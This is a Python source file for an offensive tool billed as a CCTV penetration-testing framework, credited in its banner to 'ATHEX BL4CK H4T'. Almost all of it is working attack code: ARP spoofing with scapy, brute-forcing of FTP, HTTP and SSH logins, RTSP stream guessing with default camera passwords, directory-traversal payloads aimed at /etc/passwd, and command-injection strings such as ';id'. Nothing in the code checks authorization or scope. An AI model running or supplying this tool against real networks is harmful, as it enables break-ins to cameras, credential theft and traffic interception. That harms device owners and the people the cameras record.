#!/usr/bin/env python3
"""
Advanced CCTV Penetration Testing Framework
Author: ATHEX Security Researcher & Developer
Version: 2.0
"""

import os
import sys
import time
import threading
import socket
import subprocess
import requests
import argparse
import random
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *
from ftplib import FTP
from http.client import HTTPConnection
import urllib.parse
import base64
import hashlib
import itertools
import string

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class CCTVScanner:
    def __init__(self):
        self.targets = []
        self.results = {}
        self.stop_scan = False
        self.common_ports = [80, 443, 21, 22, 23, 554, 37777, 37778, 37779, 9999]
        self.camera_urls = []
        
    def print_banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
        ██╗   ██╗██╗ ██████╗ ██╗██╗      █████╗ ███╗   ██╗████████╗    ███████╗██╗   ██╗███████╗    
        ██║   ██║██║██╔════╝ ██║██║     ██╔══██╗████╗  ██║╚══██╔══╝    ██╔════╝╚██╗ ██╔╝██╔════╝    
        ██║   ██║██║██║  ███╗██║██║     ███████║██╔██╗ ██║   ██║       █████╗   ╚████╔╝ █████╗      
        ╚██╗ ██╔╝██║██║   ██║██║██║     ██╔══██║██║╚██╗██║   ██║       ██╔══╝    ╚██╔╝  ██╔══╝      
         ╚████╔╝ ██║╚██████╔╝██║███████╗██║  ██║██║ ╚████║   ██║       ███████╗   ██║   ███████╗    
          ╚═══╝  ╚═╝ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       ╚══════╝   ╚═╝   ╚══════╝ 
                                                                                          
                Advanced CCTV Security Assessment Framework v2.0 By ATHEX BL4CK H4T
{Colors.END}
"""
        print(banner)

    def animate_loading(self, message):
        chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        i = 0
        while not self.stop_scan:
            sys.stdout.write(f"\r{Colors.YELLOW}[{chars[i]}] {message}{Colors.END}")
            sys.stdout.flush()
            time.sleep(0.1)
            i = (i + 1) % len(chars)

    def start_animation(self, message):
        self.animation_thread = threading.Thread(target=self.animate_loading, args=(message,))
        self.animation_thread.daemon = True
        self.animation_thread.start()

    def stop_animation(self):
        self.stop_scan = True
        time.sleep(0.2)
        sys.stdout.write("\r" + " " * 100 + "\r")
        self.stop_scan = False

    def port_scan(self, target, ports=None):
        if ports is None:
            ports = self.common_ports
        
        open_ports = []
        self.start_animation(f"Scanning {target} for open ports")
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, port))
                sock.close()
                if result == 0:
                    open_ports.append(port)
                    print(f"\r{Colors.GREEN}[+] Port {port} open on {target}{Colors.END}")
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(scan_port, ports)
        
        self.stop_animation()
        return open_ports

    def service_detection(self, target, port):
        services = {
            80: "HTTP",
            443: "HTTPS",
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            554: "RTSP",
            37777: "Camera Service",
            37778: "Camera Service",
            37779: "Camera Service",
            9999: "Camera Service"
        }
        
        service = services.get(port, "Unknown")
        
        try:
            if port == 80 or port == 443:
                protocol = "https" if port == 443 else "http"
                url = f"{protocol}://{target}:{port}"
                self.camera_urls.append(url)
                
                try:
                    response = requests.get(url, timeout=5, verify=False)
                    if "camera" in response.text.lower() or "ip camera" in response.text.lower():
                        service = "Camera Web Interface"
                        print(f"{Colors.GREEN}[+] Camera web interface found: {url}{Colors.END}")
                except:
                    pass
                    
        except Exception as e:
            pass
            
        return service

    def arp_spoofing(self, target, gateway, interface):
        print(f"{Colors.RED}[!] Starting ARP Spoofing attack{Colors.END}")
        print(f"{Colors.YELLOW}[*] Target: {target}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Gateway: {gateway}{Colors.END}")
        
        def spoof():
            try:
                target_mac = getmacbyip(target)
                gateway_mac = getmacbyip(gateway)
                
                packet1 = ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway)
                packet2 = ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target)
                
                while True:
                    send(packet1, verbose=0)
                    send(packet2, verbose=0)
                    time.sleep(2)
            except Exception as e:
                print(f"{Colors.RED}[-] ARP Spoofing failed: {e}{Colors.END}")
        
        spoof_thread = threading.Thread(target=spoof)
        spoof_thread.daemon = True
        spoof_thread.start()

    def password_cracking(self, target, port, service, username_list, password_list):
        print(f"{Colors.YELLOW}[*] Starting password cracking on {target}:{port} ({service}){Colors.END}")
        
        if service == "FTP":
            self.crack_ftp(target, port, username_list, password_list)
        elif "HTTP" in service:
            self.crack_http_auth(target, port, username_list, password_list)
        elif service == "SSH":
            self.crack_ssh(target, port, username_list, password_list)

    def crack_ftp(self, target, port, usernames, passwords):
        self.start_animation("Cracking FTP credentials")
        
        for username in usernames:
            for password in passwords:
                if self.stop_scan:
                    break
                try:
                    ftp = FTP()
                    ftp.connect(target, port, timeout=5)
                    ftp.login(username, password)
                    print(f"\r{Colors.GREEN}[+] FTP Credentials found: {username}:{password}{Colors.END}")
                    ftp.quit()
                    self.stop_animation()
                    return
                except:
                    continue
        
        self.stop_animation()
        print(f"{Colors.RED}[-] FTP password cracking failed{Colors.END}")

    def crack_http_auth(self, target, port, usernames, passwords):
        self.start_animation("Cracking HTTP authentication")
        
        protocol = "https" if port == 443 else "http"
        url = f"{protocol}://{target}:{port}"
        
        for username in usernames:
            for password in passwords:
                if self.stop_scan:
                    break
                try:
                    response = requests.get(url, auth=(username, password), timeout=5, verify=False)
                    if response.status_code == 200:
                        print(f"\r{Colors.GREEN}[+] HTTP Auth Credentials found: {username}:{password}{Colors.END}")
                        self.stop_animation()
                        return
                except:
                    continue
        
        self.stop_animation()
        print(f"{Colors.RED}[-] HTTP authentication cracking failed{Colors.END}")

    def crack_ssh(self, target, port, usernames, passwords):
        self.start_animation("Cracking SSH credentials")
        
        for username in usernames:
            for password in passwords:
                if self.stop_scan:
                    break
                try:
                    ssh = subprocess.Popen([
                        'sshpass', '-p', password, 'ssh', '-o', 'ConnectTimeout=5',
                        '-o', 'StrictHostKeyChecking=no', 
                        f'{username}@{target}', 'exit'
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    ssh.communicate(timeout=5)
                    if ssh.returncode == 0:
                        print(f"\r{Colors.GREEN}[+] SSH Credentials found: {username}:{password}{Colors.END}")
                        self.stop_animation()
                        return
                except:
                    continue
        
        self.stop_animation()
        print(f"{Colors.RED}[-] SSH password cracking failed{Colors.END}")

    def rtsp_bruteforce(self, target):
        print(f"{Colors.YELLOW}[*] Testing RTSP endpoints on {target}{Colors.END}")
        
        common_paths = [
            "/live.sdp", "/media.amp", "/stream1", "/main", "/cam1",
            "/h264", "/mjpeg", "/video", "/axis-media/media.amp"
        ]
        
        credentials = [
            ("admin", "admin"), ("admin", "1234"), ("admin", "password"),
            ("root", "root"), ("admin", ""), ("", "")
        ]
        
        for path in common_paths:
            for username, password in credentials:
                try:
                    auth_str = f"{username}:{password}@" if username or password else ""
                    url = f"rtsp://{auth_str}{target}:554{path}"
                    
                    # Test with ffmpeg or rtsp client
                    result = subprocess.run([
                        'timeout', '5', 'ffmpeg', '-i', url, '-t', '1',
                        '-f', 'null', '-'
                    ], capture_output=True, text=True)
                    
                    if "Video:" in result.stderr:
                        print(f"{Colors.GREEN}[+] RTSP stream accessible: {url}{Colors.END}")
                        return url
                except:
                    continue
        
        print(f"{Colors.RED}[-] No accessible RTSP streams found{Colors.END}")
        return None

    def generate_wordlist(self, base_words, output_file):
        print(f"{Colors.YELLOW}[*] Generating custom wordlist{Colors.END}")
        
        common_suffixes = ["123", "1234", "12345", "2023", "2024", "!", "@", "#"]
        
        with open(output_file, 'w') as f:
            for word in base_words:
                f.write(word + "\n")
                f.write(word.upper() + "\n")
                f.write(word.capitalize() + "\n")
                
                for suffix in common_suffixes:
                    f.write(word + suffix + "\n")
                    f.write(word.upper() + suffix + "\n")
                    f.write(word.capitalize() + suffix + "\n")
        
        print(f"{Colors.GREEN}[+] Wordlist generated: {output_file}{Colors.END}")

    def scan_network(self, network):
        print(f"{Colors.YELLOW}[*] Scanning network: {network}{Colors.END}")
        self.start_animation("Discovering hosts")
        
        try:
            result = subprocess.run([
                'nmap', '-sn', network
            ], capture_output=True, text=True)
            
            hosts = []
            for line in result.stdout.split('\n'):
                if "Nmap scan report for" in line:
                    ip = line.split()[-1].strip('()')
                    hosts.append(ip)
            
            self.stop_animation()
            print(f"{Colors.GREEN}[+] Found {len(hosts)} hosts{Colors.END}")
            return hosts
            
        except Exception as e:
            self.stop_animation()
            print(f"{Colors.RED}[-] Network scan failed: {e}{Colors.END}")
            return []

    def exploit_common_vulns(self, target):
        print(f"{Colors.YELLOW}[*] Testing common CCTV vulnerabilities on {target}{Colors.END}")
        
        vulns = [
            {"name": "Default Credentials", "test": self.test_default_creds},
            {"name": "Unauthenticated Access", "test": self.test_unauthenticated_access},
            {"name": "Directory Traversal", "test": self.test_directory_traversal},
            {"name": "Command Injection", "test": self.test_command_injection}
        ]
        
        for vuln in vulns:
            self.start_animation(f"Testing {vuln['name']}")
            result = vuln["test"](target)
            self.stop_animation()
            
            if result:
                print(f"{Colors.RED}[!] {vuln['name']} vulnerability found!{Colors.END}")
            else:
                print(f"{Colors.GREEN}[-] {vuln['name']} not vulnerable{Colors.END}")

    def test_default_creds(self, target):
        default_creds = [
            ("admin", "admin"), ("admin", "1234"), ("admin", "password"),
            ("root", "root"), ("admin", ""), ("user", "user")
        ]
        
        for port in [80, 443, 8080]:
            for username, password in default_creds:
                try:
                    protocol = "https" if port == 443 else "http"
                    url = f"{protocol}://{target}:{port}"
                    response = requests.get(url, auth=(username, password), timeout=5, verify=False)
                    if response.status_code == 200:
                        return True
                except:
                    continue
        return False

    def test_unauthenticated_access(self, target):
        paths = ["/", "/admin", "/config", "/live.sdp", "/video"]
        
        for port in [80, 443, 8080, 554]:
            for path in paths:
                try:
                    if port == 554:  # RTSP
                        url = f"rtsp://{target}:554{path}"
                    else:
                        protocol = "https" if port == 443 else "http"
                        url = f"{protocol}://{target}:{port}{path}"
                    
                    response = requests.get(url, timeout=5, verify=False) if port != 554 else None
                    if response and response.status_code == 200:
                        return True
                except:
                    continue
        return False

    def test_directory_traversal(self, target):
        traversal_payloads = [
            "../../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        for port in [80, 443, 8080]:
            for payload in traversal_payloads:
                try:
                    protocol = "https" if port == 443 else "http"
                    url = f"{protocol}://{target}:{port}/{payload}"
                    response = requests.get(url, timeout=5, verify=False)
                    if "root:" in response.text or "[extensions]" in response.text:
                        return True
                except:
                    continue
        return False

    def test_command_injection(self, target):
        payloads = [";id", "|id", "&&id", "`id`"]
        
        for port in [80, 443, 8080]:
            for payload in payloads:
                try:
                    protocol = "https" if port == 443 else "http"
                    url = f"{protocol}://{target}:{port}/cgi-bin/test.cgi?cmd=test{payload}"
                    response = requests.get(url, timeout=5, verify=False)
                    if "uid=" in response.text:
                        return True
                except:
                    continue
        return False

    def generate_report(self, filename):
        print(f"{Colors.YELLOW}[*] Generating report: {filename}{Colors.END}")
        
        with open(filename, 'w') as f:
            f.write("CCTV Penetration Testing Report\n")
            f.write("=" * 50 + "\n\n")
            
            for target, data in self.results.items():
                f.write(f"Target: {target}\n")
                f.write(f"Open Ports: {data.get('ports', [])}\n")
                f.write(f"Services: {data.get('services', [])}\n")
                f.write(f"Vulnerabilities: {data.get('vulnerabilities', [])}\n")
                f.write("\n")
        
        print(f"{Colors.GREEN}[+] Report saved to {filename}{Colors.END}")

def main():
    scanner = CCTVScanner()
    scanner.print_banner()
    
    parser = argparse.ArgumentParser(description='Advanced CCTV Penetration Testing Tool')
    parser.add_argument('-t', '--target', help='Single target IP')
    parser.add_argument('-n', '--network', help='Network range (e.g., 192.168.1.0/24)')
    parser.add_argument('-p', '--ports', help='Ports to scan (comma separated)')
    parser.add_argument('--arp-spoof', action='store_true', help='Enable ARP spoofing')
    parser.add_argument('--crack-passwords', action='store_true', help='Enable password cracking')
    parser.add_argument('--rtsp-scan', action='store_true', help='Scan for RTSP streams')
    parser.add_argument('--exploit', action='store_true', help='Test for common vulnerabilities')
    parser.add_argument('--generate-wordlist', help='Generate custom wordlist')
    
    args = parser.parse_args()
    
    if not any(vars(args).values()):
        parser.print_help()
        return
    
    # Generate wordlist if requested
    if args.generate_wordlist:
        base_words = ["admin", "password", "camera", "security", "default", "user", "root"]
        scanner.generate_wordlist(base_words, args.generate_wordlist)
    
    # Get targets
    targets = []
    if args.target:
        targets = [args.target]
    elif args.network:
        targets = scanner.scan_network(args.network)
    
    if not targets:
        print(f"{Colors.RED}[-] No targets specified{Colors.END}")
        return
    
    # Scan ports and services
    for target in targets:
        print(f"\n{Colors.BLUE}[*] Scanning target: {target}{Colors.END}")
        
        ports = [int(p) for p in args.ports.split(',')] if args.ports else None
        open_ports = scanner.port_scan(target, ports)
        
        services = []
        for port in open_ports:
            service = scanner.service_detection(target, port)
            services.append(f"{port}/{service}")
            print(f"{Colors.GREEN}[+] {target}:{port} - {service}{Colors.END}")
        
        scanner.results[target] = {
            'ports': open_ports,
            'services': services
        }
        
        # RTSP scanning
        if args.rtsp_scan:
            rtsp_url = scanner.rtsp_bruteforce(target)
            if rtsp_url:
                scanner.results[target]['rtsp_stream'] = rtsp_url
        
        # Vulnerability exploitation
        if args.exploit:
            scanner.exploit_common_vulns(target)
        
        # Password cracking
        if args.crack_passwords:
            usernames = ["admin", "root", "user", "guest"]
            passwords = ["admin", "1234", "password", "12345", ""]
            
            for port in open_ports:
                service = scanner.service_detection(target, port)
                if service in ["FTP", "HTTP", "HTTPS", "SSH"]:
                    scanner.password_cracking(target, port, service, usernames, passwords)
    
    # ARP Spoofing
    if args.arp_spoof and args.target:
        gateway = input(f"{Colors.YELLOW}[?] Enter gateway IP: {Colors.END}")
        interface = input(f"{Colors.YELLOW}[?] Enter network interface: {Colors.END}")
        scanner.arp_spoofing(args.target, gateway, interface)
    
    # Generate report
    scanner.generate_report("cctv_scan_report.txt")
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}[+] Scan completed! Check the report for details.{Colors.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Scan interrupted by user{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.END}")
        sys.exit(1)